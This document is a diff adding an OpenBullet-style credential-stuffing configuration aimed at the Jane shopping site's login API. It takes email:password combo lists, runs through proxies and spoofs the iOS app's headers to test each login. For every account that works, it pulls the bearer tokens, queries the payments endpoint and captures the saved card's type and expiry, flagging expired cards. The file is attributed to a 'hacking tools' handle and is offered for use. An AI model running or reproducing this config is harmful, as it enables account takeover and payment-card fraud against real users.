@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "Jane(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-06T20:02:06.224172+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://login.jane.com/login" 
+  CONTENT "{\"password\":\"<PASS>\",\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Jane iOS/5.7.1-4 (iOS; 14.4.1; iPhone; Apple; iPhone11,2)" 
+  HEADER "X-Jane-App-Name: jane-ios" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"accountGuid\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"message\":\"Invalid email address or password. Please try again.\"}" 
+  KEYCHAIN Ban OR 
+    KEY "We're sorry, there was a problem signing you in" 
+
+PARSE "<SOURCE>" LR "{\"accountGuid\":\"" "\",\"" -> VAR "accountGuid" 
+
+PARSE "<SOURCE>" JSON "janeAuth" -> VAR "janeAuth" 
+
+PARSE "<SOURCE>" JSON "janeToken" -> VAR "janeToken" 
+
+REQUEST GET "https://paymentsv2.jane.com/customer" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <janeToken>" 
+  HEADER "janeauth: <janeAuth>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "cardType" 
+
+PARSE "<SOURCE>" LR "\"cardType\":\"" "\",\"" CreateEmpty=FALSE -> CAP "cardType" 
+
+PARSE "<SOURCE>" LR "\"expirationMonth\":\"" "\",\"" CreateEmpty=FALSE -> CAP "expirationMonth" 
+
+PARSE "<SOURCE>" LR "\"expirationYear\":\"" "\",\"" CreateEmpty=FALSE -> CAP "expirationYear" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<expirationYear>" Contains "2017" 
+    KEY "<expirationYear>" Contains "2016" 
+    KEY "<expirationYear>" Contains "2018" 
+    KEY "<expirationYear>" Contains "2019" 
+    KEY "<expirationYear>" Contains "2020" 
+    KEY "<expirationYear>" Contains "2021" 
+    KEY "<expirationYear>" Contains "2015" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
